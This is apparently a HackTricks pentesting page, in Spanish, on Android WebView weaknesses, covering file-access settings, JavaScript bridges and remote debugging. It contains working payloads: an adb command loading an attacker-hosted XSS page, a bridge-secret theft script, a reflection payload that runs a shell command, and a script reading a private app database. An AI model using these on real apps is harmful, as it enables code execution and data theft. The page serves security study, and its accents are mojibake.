# Ataques a Webview

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Configuraciones Interesantes

Puedes identificar un WebView expuesto as√≠:

<figure><img src="../../.gitbook/assets/image (718).png" alt=""><figcaption></figcaption></figure>

### Acceso a Archivos

El acceso a archivos en _WebView_ est√° habilitado por defecto. Desde la API 3 (Cupcake 1.5) el m√©todo [_setAllowFileAccess()_](https://developer.android.com/reference/android/webkit/WebSettings.html#setAllowFileAccess\(boolean\)) est√° disponible para habilitarlo o deshabilitarlo expl√≠citamente.\
Si la aplicaci√≥n tiene _**android.permission.READ\_EXTERNAL\_STORAGE**_ podr√° leer y cargar archivos **desde el almacenamiento externo**.\
El _WebView_ necesita usar un esquema de URL de archivo, por ejemplo, `file://path/file`, para acceder al archivo.

#### Acceso Universal Desde URL de Archivo (Obsoleto)

> Establece si las **solicitudes entre or√≠genes** en el **contexto de una URL de esquema de archivo** deben permitir acceder a **contenido de cualquier origen**. Esto incluye **acceso a contenido de otras URLs de esquema de archivo o contextos web.** Ten en cuenta que algunos accesos, como los elementos de imagen HTML, no siguen las reglas de mismo origen y no se ven afectados por esta configuraci√≥n.
>
> **No** habilites esta configuraci√≥n si abres archivos que pueden ser creados o alterados por fuentes externas. Habilitar esta configuraci√≥n **permite a scripts maliciosos cargados en un contexto `file://`** lanzar ataques de scripting entre sitios, accediendo a **archivos locales arbitrarios** incluyendo cookies de WebView, datos privados de la app o incluso credenciales usadas en sitios web arbitrarios.

En resumen, esto **previene la carga de Or√≠genes arbitrarios.** La app enviar√° la solicitud de URL para cargar el contenido con **`Origin: file://`** si la respuesta no permite ese origen (**`Access-Control-Allow-Origin: file://`**) entonces el contenido no se cargar√°.\
El **valor predeterminado es `false`** al apuntar a [`Build.VERSION_CODES.JELLY_BEAN`](https://developer.android.com/reference/android/os/Build.VERSION\_CODES#JELLY\_BEAN) y superiores.

* Usa [`getAllowUniversalAccessFromFileURLs()`](https://developer.android.com/reference/android/webkit/WebSettings#getAllowUniversalAccessFromFileURLs\(\)) para saber si JavaScript ejecut√°ndose en el contexto de una URL de esquema de archivo puede acceder a contenido de cualquier origen (si UniversalAccessFromFileURL est√° habilitado).
* Usa [`setAllowUniversalAccessFromFileURLs(boolean)`](https://developer.android.com/reference/android/webkit/WebSettings#setAllowUniversalAccessFromFileURLs\(boolean\)) para habilitar/deshabilitar.

{% hint style="info" %}
Usar **`loadDataWithBaseURL()`** con `null` como baseURL tambi√©n **prevendr√° la carga de archivos locales** incluso si todas las configuraciones peligrosas est√°n habilitadas.
{% endhint %}

#### Acceso a Archivos Desde URLs de Archivo (Obsoleto) <a href="#getallowfileaccessfromfileurls" id="getallowfileaccessfromfileurls"></a>

> Establece si las solicitudes entre or√≠genes en el contexto de una URL de esquema de archivo deben permitir acceder a contenido de otras URLs de esquema de archivo. Ten en cuenta que algunos accesos, como los elementos de imagen HTML, no siguen las reglas de mismo origen y no se ven afectados por esta configuraci√≥n.
>
> **No** habilites esta configuraci√≥n si abres archivos que pueden ser creados o alterados por fuentes externas. Habilitar esta configuraci√≥n permite a scripts maliciosos cargados en un contexto `file://` acceder a archivos locales arbitrarios incluyendo cookies de WebView y datos privados de la app.

En resumen, esto previene que javascript acceda a archivos locales a trav√©s del protocolo `file://`.\
Ten en cuenta que **el valor de esta configuraci√≥n se ignora** si el valor de [`getAllowUniversalAccessFromFileURLs()`](https://developer.android.com/reference/android/webkit/WebSettings#getAllowUniversalAccessFromFileURLs\(\)) es `true`.\
El **valor predeterminado es `false`** al apuntar a [`Build.VERSION_CODES.JELLY_BEAN`](https://developer.android.com/reference/android/os/Build.VERSION\_CODES#JELLY\_BEAN) y superiores.

* Usa [`getAllowFileAccessFromFileURLs()`](https://developer.android.com/reference/android/webkit/WebSettings#getAllowFileAccessFromFileURLs\(\)) para saber si JavaScript se est√° ejecutando en el contexto de una URL de esquema de archivo puede acceder a contenido de otras URLs de esquema de archivo.
* Usa [`setAllowFileAccessFromFileURLs(boolen)`](https://developer.android.com/reference/android/webkit/WebSettings#setAllowFileAccessFromFileURLs\(boolean\)) para habilitar/deshabilitar.

#### Acceso a Archivos

> Habilita o deshabilita el **acceso a archivos dentro de WebView**. Ten en cuenta que esto habilita o deshabilita el acceso al sistema de archivos solamente. Los activos y recursos siguen siendo accesibles usando file:///android\_asset y file:///android\_res.

En resumen, si se deshabilita, el WebView no podr√° cargar un archivo local con el protocolo `file://`.\
El **valor predeterminado es `false`** al apuntar a [`Build.VERSION_CODES.R`](https://developer.android.com/reference/android/os/Build.VERSION\_CODES#R) y superiores.

* Usa [`getAllowFileAccess()`](https://developer.android.com/reference/android/webkit/WebSettings#getAllowFileAccess\(\)) para saber si la configuraci√≥n est√° habilitada.
* Usa [`setAllowFileAccess(boolean)`](https://developer.android.com/reference/android/webkit/WebSettings#setAllowFileAccess\(boolean\)) para habilitar/deshabilitar.

#### WebViewAssetLoader

> Clase de ayuda para cargar archivos locales incluyendo activos est√°ticos de la aplicaci√≥n y recursos usando URLs http(s):// dentro de una clase [`WebView`](https://developer.android.com/reference/android/webkit/WebView.html). Cargar archivos locales usando URLs similares a la web en lugar de `"file://"` es deseable ya que es compatible con la pol√≠tica de Mismo Origen.

Esta es la nueva forma recomendada de cargar archivos locales. El objetivo es **acceder a archivos locales usando una URL HTTP con el dominio**. De esta manera, el **CORS** puede ser **f√°cilmente** mantenido entre las **p√°ginas web locales** y las **p√°ginas web** que se descargan del servidor web.

### Javascript Habilitado

Los WebViews tienen Javascript **deshabilitado por defecto**. El m√©todo [`setJavaScriptEnabled()`](https://developer.android.com/reference/android/webkit/WebSettings.html#setJavaScriptEnabled\(boolean\)) puede habilitarlo o deshabilitarlo expl√≠citamente.\
Ten en cuenta que los webviews tambi√©n pueden soportar el **esquema `intent`** que permite activar otras aplicaciones. Lee este [art√≠culo para saber c√≥mo pasar de XSS a RCE](https://medium.com/@dPhoeniixx/tiktok-for-android-1-click-rce-240266e78105).

Aqu√≠ hay un ejemplo de un WebView expuesto vulnerable a XSS a trav√©s del par√°metro "support\_url" (que puede indicar la URL a cargar en el webview):

<figure><img src="../../.gitbook/assets/image (719).png" alt="" width="563"><figcaption></figcaption></figure>

Es posible explotar esa vulnerabilidad desde adb con algo como:

{% code overflow="wrap" %}
```bash
adb.exe shell am start -n com.tmh.vulnwebview/.SupportWebView ‚Äìes support_url "https://6333-157-48-216-175.ngrok-free.app/xss.html"
```
```markdown
{% endcode %}

### Puente Javascript

Android ofrece una manera para que JavaScript ejecutado en un WebView llame y utilice **funciones nativas de una aplicaci√≥n Android** (anotadas con `@JavascriptInterface`) mediante el uso del m√©todo [`addJavascriptInterface`](https://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface%28java.lang.Object,%20java.lang.String%29). Esto es conocido como _WebView JavaScript bridge_ o _puente nativo_.

Tenga en cuenta que **cuando utiliza `addJavascriptInterface`, est√° otorgando expl√≠citamente acceso al objeto de Interfaz de JavaScript registrado a todas las p√°ginas cargadas dentro de ese WebView**. Esto implica que, si el usuario navega fuera de su aplicaci√≥n o dominio, todas las dem√°s p√°ginas externas tambi√©n tendr√°n acceso a esos objetos de Interfaz de JavaScript, lo que podr√≠a representar un riesgo de seguridad potencial si se expone alg√∫n dato sensible a trav√©s de esas interfaces.

> Advertencia: Tenga mucho cuidado con las aplicaciones que apuntan a versiones de Android inferiores a Android 4.2 (nivel de API 17) ya que son [vulnerables a un fallo](https://labs.mwrinfosecurity.com/blog/webview-addjavascriptinterface-remote-code-execution/) en la implementaci√≥n de `addJavascriptInterface`: un ataque que abusa de la reflexi√≥n, lo que lleva a la ejecuci√≥n de c√≥digo remoto cuando se inyecta JavaScript malicioso en un WebView. Esto se deb√≠a a que todos los m√©todos de Object Java eran accesibles por defecto (en lugar de solo aquellos anotados).

#### An√°lisis Est√°tico
```
```javascript
//Class with a method to access a secret
public class JavascriptBridge {
// Since Android 4.2 (JELLY_BEAN_MR1, API 17) methods
// not annotated with @JavascriptInterface are not visible from JavaScript
@JavascriptInterface
public String getSecret() {
return "SuperSecretPassword";
};
}
```

```javascript
//Enabling Javascript Bridge exposing an object of the JavascriptBridge class
webView.addJavascriptInterface(new JavascriptBridge(), "javascriptBridge");
webView.reload();
```

```markup
<!-- Exploit to get the secret from JavaScript -->
<script>alert(javascriptBridge.getSecret());</script>
```
Con acceso al c√≥digo JavaScript, por ejemplo, a trav√©s de un **XSS** almacenado, un ataque **MITM** o un **sitio web malicioso** que se carga dentro del WebView, se pueden llamar directamente a los m√©todos Java expuestos.

{% hint style="info" %}
Tenga en cuenta que en el caso de intentar explotar esta vulnerabilidad a trav√©s de un **Open Redirect a una p√°gina web del atacante que accede al Objeto Nativo de Android**. Si el acceso a la redirecci√≥n se realiza a trav√©s de un **navegador m√≥vil** y **no utilizando** el mismo **WebView**, el **navegador no podr√° acceder al objeto nativo de Android**.
{% endhint %}

Si es necesario `addJavascriptInterface`, tenga en cuenta lo siguiente:

* **Solo el JavaScript proporcionado** con el APK debe estar permitido para usar los puentes, por ejemplo, verificando la URL en cada m√©todo Java enlazado (a trav√©s de `WebView.getUrl`).
* **No se debe cargar JavaScript desde puntos finales remotos**, por ejemplo, manteniendo la navegaci√≥n de la p√°gina dentro de los dominios de la aplicaci√≥n y abriendo todos los dem√°s dominios en el navegador predeterminado (por ejemplo, Chrome, Firefox).
* Si es necesario por razones heredadas (por ejemplo, tener que admitir dispositivos m√°s antiguos), **establezca al menos el nivel m√≠nimo de API en 17** en el archivo de manifiesto de la aplicaci√≥n (`<uses-sdk android:minSdkVersion="17" />`).

### Puente de Javascript a RCE a trav√©s de Reflexi√≥n

Como se se√±ala en [**esta investigaci√≥n**](https://labs.withsecure.com/archive/webview-addjavascriptinterface-remote-code-execution/) (_cons√∫ltela para obtener ideas en caso de que obtenga RCE_), una vez que encuentre un JavascriptBridge, puede ser posible obtener **RCE** a trav√©s de **Reflection** usando un payload como el siguiente:
```markup
<!-- javascriptBridge is the name of the Android exposed object -->
<script>
function execute(cmd){
return javascriptBridge.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(cmd);
}
execute(['/system/bin/sh','-c','echo \"mwr\" > /mnt/sdcard/mwr.txt']);
</script>
```
Sin embargo, las aplicaciones modernas pueden usar la **anotaci√≥n `@JavascriptInterface`** que indica al JavascriptBridge que **solo** el m√©todo con esta anotaci√≥n debe ser **expuesto**.\
En ese escenario, no podr√°s abusar de Reflection para ejecutar c√≥digo arbitrario.

### Depuraci√≥n Remota

La **depuraci√≥n remota de WebView** permite acceder al webview con las **Herramientas para Desarrolladores de Chrome.**\
El **dispositivo** necesita estar **accesible** por la PC (v√≠a USB, emulador local, red local...) y ejecutando el WebView depurable, luego accede a **chrome://inspect/#devices**:

![](<../../.gitbook/assets/image (525).png>)

Selecciona **inspect** y se abrir√° una nueva ventana. En esta ventana puedes **interactuar con el contenido** del **WebView** e incluso hacer que **ejecute c√≥digo JS arbitrario** desde la pesta√±a **console**:

![](<../../.gitbook/assets/image (526).png>)

Para habilitar la **Depuraci√≥n Remota de WebView** puedes hacer algo como:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
WebView.setWebContentsDebuggingEnabled(true);
}
```
**Esta configuraci√≥n se aplica a todos los WebViews de la aplicaci√≥n.**

{% hint style="info" %}
**La depuraci√≥n de WebView no se ve afectada por el estado de la bandera `debuggable`** en el manifiesto de la aplicaci√≥n. Si quieres habilitar la depuraci√≥n de WebView solo cuando `debuggable` es `true`, prueba la bandera en tiempo de ejecuci√≥n.
{% endhint %}
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))
{ WebView.setWebContentsDebuggingEnabled(true); }
}
```
## Cargas √∫tiles

### Exfiltrar archivos arbitrarios
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
alert(xhr.responseText);
}
}
xhr.open('GET', 'file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db', true);
xhr.send(null);
```
## Referencias

{% embed url="https://github.com/authenticationfailure/WheresMyBrowser.Android" %}

{% embed url="https://developer.android.com/reference/android/webkit/WebView" %}

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
